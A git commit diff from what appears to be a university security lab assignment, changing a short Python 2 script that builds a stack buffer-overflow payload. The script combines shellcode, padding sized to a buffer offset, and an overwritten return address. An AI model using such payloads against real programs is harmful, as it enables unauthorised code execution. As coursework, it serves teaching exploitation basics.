b2207547559e770e0262f0aad74f03ad6fc457d1
zijieku <ubuntu@ubuntu.(none)>
2015-03-26 17:45:47 -0400

    target2

--- Project/proj4/targets/sol2.py
+++ Project/proj4/targets/sol2.py
@@ -1,4 +1,8 @@
+'''
+The address for %eax is -0x6c(%ebp)
+We have to padd 0x6c number of bytes 
+'''
 from shellcode import shellcode
 from struct import pack
 
-print shellcode + "\x00"*89 + pack("<I", 0xbffee49c)
+print shellcode + "\x01" * (0x6c - len(shellcode) + 4 ) + pack("<I", 0xbffee49c)
